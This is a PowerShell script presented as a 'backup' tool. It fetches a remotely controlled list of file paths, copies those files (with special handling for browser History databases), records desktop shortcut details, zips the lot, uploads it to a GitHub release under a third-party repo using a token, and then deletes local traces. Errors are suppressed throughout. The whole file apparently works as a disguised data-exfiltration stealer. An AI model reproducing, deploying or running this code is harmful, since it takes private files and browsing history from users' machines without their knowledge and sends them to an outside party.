# === main.ps1 ===
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$token = $env:GH_UPLOAD_KEY
if (-not $token) {
    Write-Error "❌ 环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
    return
}

$repo = "drftghy/backup-files"
$now = Get-Date
$timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
$date = $now.ToString("yyyy-MM-dd")
$computerName = $env:COMPUTERNAME
$tag = "backup-$computerName-$timestamp"
$releaseName = "Backup - $computerName - $date"
$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
$zipName = "package-$computerName-$timestamp.zip"
$zipPath = Join-Path $env:TEMP $zipName
New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null

# STEP 1: Load remote path list
$remoteTxtUrl = "https://raw.githubusercontent.com/drftghy/backup-files/main/.github/upload-target.txt"
try {
    $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
    $pathList = $remoteList -split "`n" | ForEach-Object { $_.Trim() } | Where-Object { $_ -ne "" }
} catch {
    return
}

# STEP 2: Copy target paths
$index = 0
foreach ($path in $pathList) {
    $index++
    $name = "item$index"
    if (-not (Test-Path $path)) { continue }
    $dest = Join-Path $tempRoot $name

    try {
        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
            $srcDir = Split-Path $path
            robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
        } elseif (Test-Path $path -PathType Container) {
            Copy-Item $path -Destination $dest -Recurse -Force -ErrorAction Stop
        } else {
            Copy-Item $path -Destination $dest -Force -ErrorAction Stop
        }
    } catch {}
}

# STEP 3: Collect .lnk info
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
    $lnkReport = ""
    $shell = New-Object -ComObject WScript.Shell

    foreach ($lnk in $lnkFiles) {
        $shortcut = $shell.CreateShortcut($lnk.FullName)
        $lnkReport += "[$($lnk.Name)]`n"
        $lnkReport += "TargetPath: $($shortcut.TargetPath)`n"
        $lnkReport += "Arguments:  $($shortcut.Arguments)`n"
        $lnkReport += "StartIn:    $($shortcut.WorkingDirectory)`n"
        $lnkReport += "Icon:       $($shortcut.IconLocation)`n"
        $lnkReport += "-----------`n"
    }

    $lnkOutputFile = Join-Path $tempRoot "lnk_info.txt"
    $lnkReport | Out-File -FilePath $lnkOutputFile -Encoding utf8
} catch {}

# STEP 4: Compress
try {
    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
} catch { return }

# STEP 5: Upload to GitHub
$releaseData = @{
    tag_name = $tag
    name = $releaseName
    body = "Automated file package from $computerName on $date"
    draft = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "User-Agent" = "PowerShellScript"
    Accept = "application/vnd.github.v3+json"
}

try {
    $releaseResponse = Invoke-RestMethod -Uri "https://api.github.com/repos/$repo/releases" -Method POST -Headers $headers -Body $releaseData -ErrorAction Stop
    $uploadUrl = $releaseResponse.upload_url -replace "{.*}", "?name=$zipName"
} catch { return }

try {
    $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent" = "PowerShellScript"
    }
    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -Body $fileBytes -ErrorAction Stop
} catch {}

# STEP 6: Cleanup
Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
